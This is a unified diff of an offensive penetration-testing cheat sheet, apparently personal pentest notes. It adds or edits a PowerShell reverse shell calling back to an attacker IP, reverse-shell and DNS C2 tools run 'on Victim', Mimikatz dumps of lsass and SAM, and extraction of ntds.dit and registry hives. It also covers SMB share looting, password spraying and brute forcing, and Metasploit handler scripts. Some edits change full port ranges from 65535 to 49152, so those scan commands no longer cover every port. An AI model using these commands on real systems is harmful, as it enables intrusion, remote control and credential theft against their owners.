@@ -67,7 +67,7 @@ $ python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_ST
 System.Net.Sockets.TCPClient:
 
 ```
-$client = New-Object System.Net.Sockets.TCPClient("10.10.13.37",1337);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "# ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+$client = New-Object System.Net.Sockets.TCPClient("10.10.13.37",1337);$stream = $client.GetStream();[byte[]]$bytes = 0..49152|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "# ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
 ```
 
 
@@ -176,7 +176,7 @@ $ export DOMAIN_NAME=c.c2cdomain.net
 $ make build-all OSARCH="linux/amd64"
 ```
 
-Run server:
+Run server on Attacker:
 
 ```
 $ cd release/
@@ -184,10 +184,58 @@ $ sudo systemctl stop systemd-resolved
 $ sudo ./chaserv_linux_amd64
 ```
 
-Run client:
+Run client on Victim:
 
 ```
-./chashell_linux_amd64
+$ ./chashell_linux_amd64
+```
+
+
+
+
+## Helpers
+
+
+
+### pwncat
+
+* [https://securixy.kz/hack-faq/pwncat-netcat-na-steroidah.html/](https://securixy.kz/hack-faq/pwncat-netcat-na-steroidah.html/)
+* [https://github.com/cytopia/pwncat](https://github.com/cytopia/pwncat)
+
+
+
+### VbRev
+
+* [https://github.com/VbScrub/VbRev](https://github.com/VbScrub/VbRev)
+
+
+
+### xc
+
+* [https://github.com/xct/xc](https://github.com/xct/xc)
+
+Listen:
+
+```
+$ rlwrap ./xc -l -p 443
+```
+
+Launch:
+
+```
+PS > Start-Process -NoNewWindow .\xc.exe 10.10.13.38 443
+```
+
+
+
+### ShellPop
+
+* [https://github.com/0x00-0x00/ShellPop](https://github.com/0x00-0x00/ShellPop)
+
+Bash reverse TCP:
+
+```
+$ shellpop -H 192.168.119.124 -P 9001 --reverse --number 8 --base64
 ```
 
 
@@ -273,16 +321,16 @@ $client=New-Object System.Net.WebClient;$proxy=New-Object System.Net.WebProxy("h
 ### /dev/tcp
 
 ```
-# Sender:
+ # Sender:
 root@kali:$ tar -zcvf folder.tar.gz folder
 root@kali:$ nc -w3 -lvnp 1234 < folder.tar.gz
-# Recipient:
+ # Recipient:
 www-data@victim:$ bash -c 'cat < /dev/tcp/127.0.0.1/1234 > .folder.tar.gz'
 www-data@victim:$ tar -zxvf .folder.tar.gz
 
-# Recipient:
+ # Recipient:
 root@kali:$ nc -w3 -lvnp 1234 > file.txt
-# Sender:
+ # Sender:
 www-data@victim:$ bash -c 'cat < file.txt > /dev/tcp/127.0.0.1/1234'
 ```
 
@@ -317,13 +365,13 @@ PS > [IO.File]::WriteAllBytes("C:\inetpub\wwwroot\uploads\tunnel.aspx", [Convert
 Start SMB server:
 
 ```
-$ smbserver.py -smb2support files `pwd`
+$ sudo smbserver.py -smb2support files `pwd`
 ```
 
 Mount SMB in Windows with `net use`:
 
 ```
-$ smbserver.py -username snovvcrash -password 'Passw0rd!' -smb2support share `pwd`
+$ sudo smbserver.py -username snovvcrash -password 'Passw0rd!' -smb2support share `pwd`
 PS > net use Z: \\10.10.14.16\share
 PS > net use Z: \\10.10.14.16\share /u:snovvcrash 'Passw0rd!'
 ```
@@ -331,7 +379,7 @@ PS > net use Z: \\10.10.14.16\share /u:snovvcrash 'Passw0rd!'
 Mount SMB in Windows with `New-PSDrive`:
 
 ```
-$ smbserver.py -username snovvcrash -password 'Passw0rd!' -smb2support share `pwd`
+$ sudo smbserver.py -username snovvcrash -password 'Passw0rd!' -smb2support share `pwd`
 PS > $pass = 'Passw0rd!' | ConvertTo-SecureString -AsPlainText -Force
 PS > $cred = New-Object System.Management.Automation.PSCredential('snovvcrash', $pass)
 Or
@@ -385,10 +433,13 @@ $ sudo pkill atftpd
 
 # VNC
 
-Decrypt TightVNC password:
+## TightVNC
+
+* [https://github.com/frizb/PasswordDecrypts](https://github.com/frizb/PasswordDecrypts)
+
+Decrypt TightVNC password with MSF:
 
 ```
-$ msdbrun -q
 msf > irb
 >> fixedkey = "\x17\x52\x6b\x06\x23\x4e\x58\x07"
 => "\u0017Rk\u0006#NX\a"
@@ -397,8 +448,6 @@ msf > irb
 >> Rex::Proto::RFB::Cipher.decrypt ["f0f0f0f0f0f0f0f0"].pack('H*'), fixedkey
 => "<DECRYPTED>"
 ```
-
-* [https://github.com/frizb/PasswordDecrypts](https://github.com/frizb/PasswordDecrypts)
 
 
 
@@ -409,8 +458,22 @@ msf > irb
 Check for SMB vulnerablities with Nmap NSE:
 
 ```
-$ sudo nmap -sV --script-args=unsafe=1 --script=smb-os-discovery 10.10.13.37 -p139,445
-$ sudo nmap -n -Pn -sV --script='smb-vuln*' 10.10.13.37 -p445
+$ sudo nmap -sV --script-args=unsafe=1 --script smb-os-discovery 10.10.13.37 -p139,445
+$ sudo nmap -n -Pn -sV --script 'smb-vuln*' 10.10.13.37 -p445
+```
+
+
+
+
+## Fingerprint
+
+* [https://book.hacktricks.xyz/pentesting/pentesting-smb#smb-server-version](https://book.hacktricks.xyz/pentesting/pentesting-smb#smb-server-version)
+
+Get SMB version for ancient versions of Samba:
+
+```
+$ sudo ngrep -i -d eth0 's.?a.?m.?b.?a.*[[:digit:]]' port 139
+$ echo exit | smbclient -L 10.10.13.37 --option='client min protocol=LANMAN1'
 ```
 
 
@@ -421,20 +484,20 @@ $ sudo nmap -n -Pn -sV --script='smb-vuln*' 10.10.13.37 -p445
 Mount:
 
 ```
-$ mount -t cifs '//127.0.0.1/Users' /mnt/smb -v -o user=snovvcrash,[pass='Passw0rd!']
+$ sudo mount -t cifs '//127.0.0.1/Users' /mnt/smb -v -o user=snovvcrash,[pass='Passw0rd!']
 ```
 
 Status:
 
 ```
-root@kali:~# mount -v | grep 'type cifs'
-root@kali:~# root@kali:~# df -k -F cifs
+$ mount -v | grep 'type cifs'
+$ df -k -F cifs
 ```
 
 Unmount:
 
 ```
-root@kali:~# umount /mnt/smb
+$ sudo umount /mnt/smb
 ```
 
 
@@ -453,6 +516,14 @@ With user creds:
 
 ```
 $ smbclient -U snovvcrash '\\127.0.0.1\Users' 'Passw0rd!'
+```
+
+Get all files recursively:
+
+```
+smb: \> recurse ON
+smb: \> prompt OFF
+smb: \> mget *
 ```
 
 
@@ -481,13 +552,13 @@ $ smbmap -H 127.0.0.1 -u null -p "" -R
 Discover rpcbind:
 
 ```
-$ sudo nmap -sV --script=rpcinfo 10.10.10.0/24 -p111
+$ sudo nmap -sV --script rpcinfo 10.10.10.0/24 -p111
 ```
 
 Run Nmap scripts:
 
 ```
-$ sudo nmap -sV --script='nfs*' 10.10.10.0/24 -p111
+$ sudo nmap -sV --script 'nfs*' 10.10.10.0/24 -p111
 ```
 
 
@@ -509,7 +580,7 @@ $ sudo mount -v -t nfs -o vers=3 -o nolock -o user=snovvcrash,[pass='Passw0rd!']
 Enum with Nmap NSE:
 
 ```
-$ sudo nmap -sU -p69 --script tftp-enum 10.10.13.37
+$ sudo nmap -sVU -p69 --script tftp-enum 10.10.13.37
 ```
 
 ## Brute Force Filenames
@@ -716,9 +787,9 @@ Enumerate all AD Computers:
 ## Nmap NSE
 
 ```
-$ nmap -n -Pn -sV --script=ldap-rootdse 127.0.0.1 -p389
-$ nmap -n -Pn -sV --script=ldap-search 127.0.0.1 -p389
-$ nmap -n -Pn -sV --script=ldap-brute 127.0.0.1 -p389
+$ nmap -n -Pn -sV --script ldap-rootdse 127.0.0.1 -p389
+$ nmap -n -Pn -sV --script ldap-search 127.0.0.1 -p389
+$ nmap -n -Pn -sV --script ldap-brute 127.0.0.1 -p389
 ```
 
 
@@ -2065,6 +2136,8 @@ $ grep -P 'Username: ' lsass-pypykatz.minidump -A4 | grep -e Username -e Domain 
 
 ### Mimikatz
 
+In case of Windows 10 version 1803-1809 use [Mimikatz v2.1.1](https://github.com/gentilkiwi/mimikatz/files/4167347/mimikatz_trunk.zip), see [Key import error](https://github.com/gentilkiwi/mimikatz/issues/248):
+
 ```
 Cmd > .\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords full" "exit"
 ```
@@ -2088,8 +2161,19 @@ meterpreter > lsa_dump_secrets
 
 
 
+### SAM
 
-## ntds.dit
+
+#### Mimikatz
+
+```
+PS > Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "log sam.txt" "lsadump::sam" "exit"'
+```
+
+
+
+
+## NTDS + SAM
 
 Locate `diskshadow.exe`:
 
@@ -2134,11 +2218,11 @@ cmd /c reg.exe save hklm\security C:\smb_pentest\security.hive
 cmd /c net share pentest=c:\smb_pentest /GRANT:"Everyone,FULL"
 
 $ smbclient.py 'snovvcrash:Passw0rd!@127.0.0.1'
-# use pentest
-# get ntds.dit
-# get system.hive
-# get sam.hive
-# get security.hive
+> use pentest
+> get ntds.dit
+> get system.hive
+> get sam.hive
+> get security.hive
 ```
 
 Delete shadow volume:
@@ -2241,7 +2325,7 @@ mimikatz # dpapi::cred /in:00ff00ff00ff00ff00ff00ff00ff00ff
 
 ```
 PS > .\SharpDPAPI.exe triage /password:Passw0rd!
-PS > .\SharpDPAPI.exe machinetriage /password:Passw0rd!
+PS > .\SharpDPAPI.exe machinetriage [/password:Passw0rd!]
 ```
 
 
@@ -2681,7 +2765,7 @@ meterpreter > transport next
 Automation (about `exploit` options [here](https://github.com/rapid7/metasploit-framework/blob/4049c41ac1b6f12566b055dc5442192072ea5d78/lib/msf/ui/console/command_dispatcher/exploit.rb#L17-L27)):
 
 ```
-# auto.rc
+// auto.rc
 use exploit/multi/handler
 set payload windows/meterpreter/reverse_https
 set lhost 10.10.13.37
@@ -2744,7 +2828,7 @@ if defined?(PryByebug)
   Pry.commands.alias_command 'f', 'finish'
 end
 
-# Hit Enter to repeat last command
+ # Hit Enter to repeat last command
 Pry::Commands.command /^$/, "repeat last command" do
   _pry_.run_command Pry.history.to_a.last
 end
@@ -2877,7 +2961,7 @@ Check:
 ```
 $ host facebook.com ns.example.com
 $ dig +short @ns.example.com test.openresolver.com TXT
-$ nmap -sU -sV --script=dns-recursion ns.example.com -p53
+$ nmap -sU -sV --script dns-recursion ns.example.com -p53
 ```
 
 
@@ -2983,35 +3067,6 @@ $ sudo python ikeforce.py <IP> -e -w wordlists/groupnames.dic t <TRANSFORM-SET-I
 Dicts:
 - /usr/share/seclists/Miscellaneous/ike-groupid.txt
 - ~/tools/ikeforce/wordlists/groupnames.dic
-```
-
-
-
-
-
-# Discovery
-
-
-
-
-## nmapAutomator
-
-```
-$ sudo apt install sslscan nikto joomscan wpscan smbmap enum4linux dnsrecon
-$ sudo python3 -m pip install droopescan
-$ sudo wget https://github.com/vulnersCom/nmap-vulners/raw/master/vulners.nse -O /usr/share/nmap/scripts/vulners.nse && nmap --script-updatedb
-$ git clone https://github.com/21y4d/nmapAutomator ~/tools/nmapAutomator
-$ sudo ln -s ~/tools/nmapAutomator/nmapAutomator.sh /usr/local/bin/nmapAutomator.sh
-```
-
-
-
-
-## AutoRecon
-
-```
-$ sudo apt install seclists curl enum4linux gobuster nbtscan nikto nmap onesixtyone oscanner smbclient smbmap smtp-user-enum snmp sslscan sipvicious tnscmd10g whatweb wkhtmltopdf
-$ sudo python3 -m pip install git+https://github.com/Tib3rius/AutoRecon.git
 ```
 
 
@@ -3152,11 +3207,11 @@ user@vict:$ find / -type f -readable -newermt '2020-03-16' ! -newermt '2020-03-1
 Find SUID binaries:
 
 ```
-# User
+ # User
 find / -type f -perm /4000 -ls 2>/dev/null
-# Group
+ # Group
 find / -type f -perm /2000 -ls 2>/dev/null
-# Both
+ # Both
 find / -type f -perm /6000 -ls 2>/dev/null
 ```
 
@@ -3427,9 +3482,9 @@ Benchmarks:
 ```
 $ nvidia-smi.exe
 
-# MD5
+ # MD5
 $ ./hashcat64.exe -m 0 -b
-# NTLM
+ # NTLM
 $ ./hashcat64.exe -m 1000 -b
 ```
 
@@ -3480,7 +3535,7 @@ $ mysql -u snovvcrash -p'Passw0rd!' -e 'show databases;'
 
 ```
 $ sudo wget https://gist.githubusercontent.com/JukArkadiy/3d6cff222d1b87e963e7/raw/fbe6fe17a9bca6ce839544b7afb2276fff061d46/oracle-tns-poison.nse -O /usr/share/nmap/scripts/oracle-tns-poison.nse
-$ sudo nmap -v -n -Pn -sV --script=oracle-tns-poison.nse -oA CVE-2014-0160/nmap/tns-poison -p1521 10.10.13.37
+$ sudo nmap -v -n -Pn -sV --script oracle-tns-poison.nse -oA CVE-2014-0160/nmap/tns-poison -p1521 10.10.13.37
 ```
 
 
@@ -3976,11 +4031,38 @@ GitHub:
 
 
 
-## Unsorted
+## Tools
+
+
+
+### gobuster
+
+* [https://github.com/OJ/gobuster/releases](https://github.com/OJ/gobuster/releases)
 
 ```
 $ gobuster dir -u 'http://127.0.0.1' -w /usr/share/wordlists/dirbuster/directory-list[-lowercase]-2.3-medium.txt -x php,asp,aspx,jsp,ini,config,cfg,xml,htm,html,json,bak,txt -t 50 -a 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0' -s 200,204,301,302,307,401 -o gobuster/127.0.0.1
+```
+
+
+
+### Nikto
+
+* [https://github.com/sullo/nikto](https://github.com/sullo/nikto)
+
+```
 $ nikto -h http://127.0.0.1 -Cgidirs all
+```
+
+
+
+### WPScan
+
+* [https://github.com/wpscanteam/wpscan](https://github.com/wpscanteam/wpscan)
+* [https://wpscan.com/profile](https://wpscan.com/profile)
+
+```
+$ wpscan --url http://10.10.13.37/wp/ --api-token <API_TOKEN> --force -e ap
+$ wpscan --url http://10.10.13.37/wp/ --api-token <API_TOKEN> --force --passwords /usr/share/seclists/Passwords/darkweb2017-top1000.txt
 ```
 
 
@@ -4015,7 +4097,7 @@ $ sudo apt install openjdk-11-jdk
 
 ```
 $ cd ~/ws/  # workspace
-$ mkdir -p discover/{nmap,masscan} enum/bloodhound/bloodhound.py loot/ log/ screenshots/ shells/ tickets/ traffic/
+$ mkdir -p discover/{nmap,services} enum/bloodhound/bloodhound.py loot/ log/ screenshots/ shells/ tickets/ traffic/
 ```
 
 
@@ -4307,7 +4389,7 @@ Remote Management Interfaces:
 Nmap:
 
 ```
-$ nmap -n -Pn -iL subnets/ranges.txt -oA hosts/rmisweep -p22,3389,2222,5985,5986 [--min-rate 1280 --min-hostgroup 256]
+$ nmap -n -Pn -iL subnets/ranges.txt -oA hosts/rmisweep -p22,3389,2222,5900,5985,5986 [--min-rate 1280 --min-hostgroup 256]
 $ grep 'open' hosts/rmisweep.gnmap |cut -d' ' -f2 |sort -u -t'.' -k1,1n -k2,2n -k3,3n -k4,4n >> hosts/targets.txt
 ```
 
@@ -4319,13 +4401,19 @@ $ grep 'open' hosts/rmisweep.gnmap |cut -d' ' -f2 |sort -u -t'.' -k1,1n -k2,2n -
 ```
 PS > Invoke-Portscan -Hosts 127.0.0.0/24 -sn -noProgressMeter
 PS > Invoke-Portscan -Hosts 127.0.0.0/24 -T 4 -TopPorts 25 -oA top25
-PS > Invoke-Portscan -Hosts 127.0.0.1 -Ports 21,22,23,25,53,80,88,111,135,137,139,161,389,443,445,464,500,593,636,873,1099,1433,1521,2049,3268,3269,3306,3389,4786,5432,5555,5900,5985,5986,6379,8080,9389,9200,27017
+PS > Invoke-Portscan -Hosts 127.0.0.1 -Ports 22,80,443
 ```
 
 
 
 
 ## Services
+
+Automators:
+
+* [https://github.com/21y4d/nmapAutomator](https://github.com/21y4d/nmapAutomator)
+* [https://github.com/Tib3rius/AutoRecon](https://github.com/Tib3rius/AutoRecon)
+* [https://github.com/carlospolop/legion](https://github.com/carlospolop/legion)
 
 
 
@@ -4375,14 +4463,14 @@ $ ln -s ~/tools/parsenmap-py/parsenmap.py /usr/local/bin/parsenmap.py
 Echo:
 
 ```
-$ IP="0.0.0.0"; for p in $(seq 1 65535); do (timeout 1 bash -c "echo '.' >/dev/tcp/$IP/$port && echo OPEN:$port" >> hosts/ports.txt &) 2>/dev/null; done
+$ IP="0.0.0.0"; for p in $(seq 1 49152); do (timeout 1 bash -c "echo '.' >/dev/tcp/$IP/$port && echo OPEN:$port" >> hosts/ports.txt &) 2>/dev/null; done
 $ sort -u -t':' -k1,1n hosts/ports.txt > hosts/echo-ports.txt && rm hosts/ports.txt
 ```
 
 Netcat:
 
 ```
-$ seq 1 65535|xargs -n 1|xargs -P 0 -I {} nc -nv -z -w1 0.0.0.0 {} 2>&1| grep -vE "timed out|now in progress|Connection refused"
+$ seq 1 49152 | xargs -n1 | xargs -P0 -I {} nc -nzv -w1 0.0.0.0 {} 2>&1 | grep -vE "timed out|now in progress|Connection refused"
 ```
 
 Nmap:
@@ -4404,7 +4492,7 @@ $ nmaptocsv.py -x services/quick-sweep.xml -d',' -f ip-fqdn-port-protocol-servic
 ### Ports (Full)
 
 ```
-$ nmap -n -Pn -sV -sC -iL hosts/targets.txt -oA services/alltcp-versions -p0-65535 --min-rate 50000 --min-hostgroup 256
+$ nmap -n -Pn -sV -sC -iL hosts/targets.txt -oA services/alltcp-versions -p0-49152 --min-rate 50000 --min-hostgroup 256
 ```
 
 Define which NSE scripts ran:
@@ -4446,9 +4534,9 @@ $ cat nmap/initial.nmap | egrep -o '^[0-9]{1,5}' | awk -F/ '{ print $1 }' ORS=',
 Fast port discovery with Masscan + versions and scripts with Nmap:
 
 ```
-$ sudo masscan --rate=1000 -e tun0 -p0-65535 127.0.0.1 > masscan/ports
+$ sudo masscan --rate=1000 -e tun0 -p0-65535,U:0-65535 127.0.0.1 > masscan/ports
 $ ports=`cat masscan/ports | awk -F " " '{print $4}' | awk -F "/" '{print $1}' | sort -n | tr "\n" ',' | sed 's/,$//'`
-$ sudo nmap -n -Pn -sVC [-sT] [--reason] -oA nmap/tcp 127.0.0.1 -p$ports
+$ sudo nmap -n -Pn -sVC [-sT] [-A] [--reason] -oA nmap/tcp 127.0.0.1 -p$ports
 ```
 
 Fast port discovery with Nmap + versions and scripts with Nmap (TCP & UDP):
@@ -4456,7 +4544,7 @@ Fast port discovery with Nmap + versions and scripts with Nmap (TCP & UDP):
 ```
 $ sudo nmap -n -Pn --min-rate 1000 -T4 127.0.0.1 -p- -v --open | tee nmap/ports_tcp
 $ ports_tcp=`cat nmap/ports_tcp | grep '^[0-9]' | awk -F "/" '{print $1}' | tr "\n" ',' | sed 's/,$//'`
-$ sudo nmap -n -Pn -sVC [-sT] [--reason] -oA nmap/tcp 127.0.0.1 -p$ports_tcp
+$ sudo nmap -n -Pn -sVC [-sT] [-A] [--reason] -oA nmap/tcp 127.0.0.1 -p$ports_tcp
 
 $ sudo nmap -n -Pn -sU [--max-retries 1] 127.0.0.1 -v --open | tee nmap/ports_udp
 $ ports_udp=`cat nmap/ports_udp | grep '^[0-9]' | awk -F "/" '{print $1}' | tr "\n" ',' | sed 's/,$//'`
@@ -4474,46 +4562,53 @@ $ cat /usr/share/nmap/scripts/scripts.db | grep smb
 
 Top TCP ports:
 
-| Port  |            Service            |
-|-------|-------------------------------|
-|    21 | FTP                           |
-|    22 | SSH                           |
-|    23 | Telnet                        |
-|    25 | SMTP                          |
-|    53 | DNS                           |
-|    80 | HTTP                          |
-|    88 | KDC                           |
-|   111 | SUNRPC                        |
-|   135 | MSRPC                         |
-|   137 | NetBIOS                       |
-|   139 | SMB                           |
-|   389 | LDAP                          |
-|   443 | SSL/TLS                       |
-|   445 | SMB                           |
-|   464 | KPASSWD                       |
-|   593 | HTTP RPC Endpoint Mapper      |
-|   636 | LDAP over SSL/TLS             |
-|   873 | RSYNC                         |
-|  1099 | JavaRMI                       |
-|  1433 | MSSQL                         |
-|  1521 | Oracle                        |
-|  2049 | NFS                           |
-|  3268 | Microsoft Global Catalog      |
-|  3269 | Microsoft Global Catalog      |
-|  3306 | MySQL/MariaDB                 |
-|  3389 | RDP                           |
-|  4786 | Cisco Smart Install           |
-|  5432 | PostgreSQL                    |
-|  5555 | HP Data Protector             |
-|  5900 | VNC                           |
-|  5985 | WinRM                         |
-|  5986 | WinRM over SSL/TLS            |
-|  6379 | Redis                         |
-|  8080 | HTTP                          |
-|  8443 | SSL/TLS                       |
-|  9389 | Active Directory Web Services |
-|  9200 | Elasticsearch                 |
-| 27017 | MongoDB                       |
+|                     Port                     |              Service             |
+|:--------------------------------------------:|:--------------------------------:|
+| 21                                           | FTP                              |
+| 22,2222                                      | SSH                              |
+| 23                                           | Telnet                           |
+| 25                                           | SMTP                             |
+| 53                                           | DNS                              |
+| 80,8080                                      | HTTP                             |
+| 88                                           | KDC                              |
+| 111                                          | SUNRPC                           |
+| 135                                          | MSRPC                            |
+| 137                                          | NetBIOS                          |
+| 139,445                                      | SMB over NetBIOS,SMB over TCP/IP |
+| 389,636                                      | LDAP,LDAP over SSL/TLS           |
+| 443,8443                                     | SSL/TLS                          |
+| 593                                          | HTTP RPC Endpoint Mapper         |
+| 873                                          | RSYNC                            |
+| 1090,1098,1099,4444,11099,47001,47002,10999  | Java RMI                         |
+| 1433                                         | MSSQL                            |
+| 1521                                         | Oracle                           |
+| 2049                                         | NFS                              |
+| 2375                                         | Docker                           |
+| 3268,3269                                    | Microsoft Global Catalog         |
+| 3306                                         | MySQL/MariaDB                    |
+| 3389                                         | RDP                              |
+| 4786                                         | Cisco Smart Install              |
+| 4848                                         | GlassFish                        |
+| 4990                                         | Atlassian Crowd                  |
+| 5432                                         | PostgreSQL                       |
+| 5555,5556                                    | HP Data Protector                |
+| 5900                                         | VNC                              |
+| 5985,5986                                    | WinRM,WinRM over SSL/TLS         |
+| 6066                                         | Apache Spark                     |
+| 6379                                         | Redis                            |
+| 7000-7004,8000-8003,9000-9003,9503,7070,7071 | WebLogic                         |
+| 8088                                         | Apache Hadoop                    |
+| 8500                                         | Hashicorp Consul                 |
+| 8686,9012,50500                              | JMX                              |
+| 8880                                         | IBM WebSphere                    |
+| 8383                                         | Zoho Manageengine Desktop        |
+| 8983                                         | Apache Solr                      |
+| 9000                                         | Portainer                        |
+| 9389                                         | Active Directory Web Services    |
+| 9200                                         | Elasticsearch                    |
+| 11111,4444,4445                              | jBoss                            |
+| 27017                                        | MongoDB                          |
+| 45000,45001                                  | JDWP                             |
 
 Top UDP ports:
 
@@ -4521,19 +4616,19 @@ Top UDP ports:
 |------|------------|
 |   53 | DNS        |
 |   67 | DHCP       |
-|   68 | DHCP       |
 |   69 | TFTP       |
 |   88 | KDC        |
 |  123 | NTP        |
 |  137 | NetBIOS    |
 |  161 | SNMP       |
-|  162 | SNMPTRAP   |
 |  500 | IKE        |
 | 3391 | RD Gateway |
 
 ```
-$ sudo masscan [-e eth0] --rate=500 --open -p21,22,23,25,53,80,88,111,135,137,139,161,389,443,445,464,500,593,636,873,1099,1433,1521,2049,3268,3269,3306,3389,4786,5432,5555,5900,5985,5986,6379,8080,9389,9200,27017,U:161,U:500 -iL routes.txt --resume paused.conf >> masscan.out
-$ mkdir services && for p in 21 22 23 25 53 80 88 111 135 137 139 161 389 443 445 464 500 593 636 873 1099 1433 1521 2049 3268 3269 3306 3389 4786 5432 5555 5900 5985 5986 6379 8080 9389 9200 27017; do grep "port $p/tcp" masscan.out | awk -F' ' '{print $6}' | sort -u -t'.' -k1,1n -k2,2n -k3,3n -k4,4n > "services/port$p.txt"; done
+$ ports=21,22,23,25,53,80,88,111,135,137,139,389,443,445,593,636,873,1090,1098,1099,1433,1521,2049,2222,2375,3268,3269,3306,3389,4444,4445,4786,4848,4990,5432,5555,5556,5900,5985,5986,6066,6379,7000,7001,7002,7003,7004,7070,7071,8000,8001,8002,8003,8080,8088,8383,8443,8500,8686,8880,8983,9000,9001,9002,9003,9012,9200,9389,9503,10999,11099,11111,27017,45000,45001,47001,47002,50500
+
+$ sudo masscan [-e eth0] --rate=500 --open -p$ports -iL hosts.txt --resume paused.conf >> masscan.out
+$ mkdir services && for p in `echo $ports | tr ',' ' '`; do grep "port $p/tcp" masscan.out | awk -F' ' '{print $6}' | sort -u -t'.' -k1,1n -k2,2n -k3,3n -k4,4n > "services/port$p.txt"; done
 ```
 
 
@@ -4649,7 +4744,7 @@ msf > use auxiliary/scanner/netbios/nbname
 #### Check
 
 ```
-$ sudo nmap -n -Pn -sV --script=smb-vuln-ms08-067 10.10.13.37 -p445
+$ sudo nmap -n -Pn -sV --script smb-vuln-ms08-067 10.10.13.37 -p139,445
 Or
 msf > use exploit/windows/smb/ms08_067_netapi
 msf > check
@@ -4673,7 +4768,7 @@ msf > exploit
 #### Check
 
 ```
-$ sudo nmap -n -Pn -sV --script=smb-vuln-ms17-010 10.10.13.37 -p445
+$ sudo nmap -n -Pn -sV --script smb-vuln-ms17-010 10.10.13.37 -p139,445
 Or
 msf > use auxiliary/scanner/smb/smb_ms17_010
 ```
@@ -4710,6 +4805,8 @@ def smb_pwn(conn, arch):
 
 
 ### SambaCry
+
+**CVE-2017-7494**
 
 * [https://github.com/joxeankoret/CVE-2017-7494](https://github.com/joxeankoret/CVE-2017-7494)
 
@@ -4984,8 +5081,8 @@ Use:
 ```
 $ cme smb 127.0.0.1
 $ cme smb 127.0.0.1 -u anonymous -p '' --shares
-$ cme smb 127.0.0.1 -u snovvcrash -p /usr/share/seclists/Passwords/xato-net-10-million-passwords-1000000.txt
-$ cme smb 127.0.0.1 -u nullinux_users.txt -p 'Passw0rd!' --shares [--continue-on-success]
+$ cme smb 127.0.0.1 -u '' -p '' -d WORKGROUP --shares
+$ cme smb 127.0.0.1 -u nullinux_users.txt -p passwords.txt --shares [--no-bruteforce] [--continue-on-success]
 $ cme smb 127.0.0.1 -u snovvcrash -p 'Passw0rd!' --spider-folder 'E\$' --pattern s3cret
 $ cme smb 127.0.0.1 -u j.doe -p 'Passw0rd!' -d 'CORP' --spider Users --pattern '.'
 $ cme smb 127.0.0.1 -u snovvcrash -p '' --local-auth --sam
@@ -5063,7 +5160,7 @@ PS > .\SharpHound.exe -c SessionLoop -d megacorp.local
 Show percentage of collected user sessions ([example](https://www.youtube.com/watch?v=q86VgM2Tafc)):
 
 ```
-# http://localhost:7474/browser/
+ # http://localhost:7474/browser/
 MATCH (u1:User)
 WITH COUNT(u1) AS totalUsers
 MATCH (c:Computer)-[r:HasSession]->(u2:User)
@@ -5434,7 +5531,7 @@ $ python -m peas --brute-unc -u 'MEGACORP\snovvcrash' -p 'Passw0rd!' mx.megacorp
 ### CVE-2020-0688
 
 * [https://www.thezdi.com/blog/2020/2/24/cve-2020-0688-remote-code-execution-on-microsoft-exchange-server-through-fixed-cryptographic-keys](https://www.thezdi.com/blog/2020/2/24/cve-2020-0688-remote-code-execution-on-microsoft-exchange-server-through-fixed-cryptographic-keys)
-* [https://github.com/pwntester/ysoserial.net/releases/latest](https://github.com/pwntester/ysoserial.net/releases/latest)
+* [https://github.com/pwntester/ysoserial.net/releases](https://github.com/pwntester/ysoserial.net/releases)
 
 ```
 Get ViewStateUserKey: Browser → F12 → Storage → ASP.NET_SessionId
@@ -5681,10 +5778,10 @@ Build drivers from source and install:
 
 ```
 $ sudo -i
-# echo "blacklist r8188eu" >> "/etc/modprobe.d/realtek.conf"
-# git clone https://github.com/aircrack-ng/rtl8188eus/tree/v5.3.9 /opt/rtl8188eus && cd /opt/rtl8188eus
-# make && make install
-# reboot
+ # echo "blacklist r8188eu" >> "/etc/modprobe.d/realtek.conf"
+ # git clone https://github.com/aircrack-ng/rtl8188eus/tree/v5.3.9 /opt/rtl8188eus && cd /opt/rtl8188eus
+ # make && make install
+ # reboot
 ```
 
 Test for packet injections:
@@ -5713,9 +5810,9 @@ Or build from source and install:
 
 ```
 $ sudo -i
-# git clone https://github.com/aircrack-ng/rtl8812au /opt/rtl8812au && cd /opt/rtl8812au
-# ./dkms-install.sh
-# reboot
+ # git clone https://github.com/aircrack-ng/rtl8812au /opt/rtl8812au && cd /opt/rtl8812au
+ # ./dkms-install.sh
+ # reboot
 ```
 
 Test for packet injections:
@@ -6600,24 +6697,24 @@ Configure multiple interfaces to work simultaneously:
 
 ```
 $ cat /etc/network/interfaces
-# This file describes the network interfaces available on your system
-# and how to activate them. For more information, see interfaces(5).
+ # This file describes the network interfaces available on your system
+ # and how to activate them. For more information, see interfaces(5).
 
 source /etc/network/interfaces.d/*
 
-# NAT
+ # NAT
 allow-hotplug eth0
 iface eth0 inet dhcp
 
-# Internal
+ # Internal
 allow-hotplug eth1
 iface eth1 inet dhcp
 
-# Host-only
+ # Host-only
 allow-hotplug eth2
 iface eth2 inet dhcp
 
-# The loopback network interface
+ # The loopback network interface
 auto lo
 iface lo inet loopback
 ```
@@ -7025,7 +7122,7 @@ $ convert img1.png img2.png -fx "(((255*u)&(255*(1-v)))|((255*(1-u))&(255*v)))/2
 
 
 
-## Tools
+## Utilities
 
 
 
@@ -7163,15 +7260,15 @@ $ sudo iptables -S [INPUT [1]]
 ### fail2ban
 
 ```bash
-# Filters location which turn into *user-defined* fail2ban iptables rules (automatically)
+ # Filters location which turn into *user-defined* fail2ban iptables rules (automatically)
 /etc/fail2ban/filter.d
 
-# Status
+ # Status
 $ sudo service fail2ban status
 $ sudo fail2ban-client status
 $ sudo fail2ban-client status sshd
 
-# Unban all
+ # Unban all
 $ sudo fail2ban-client unban --all
 ```
 
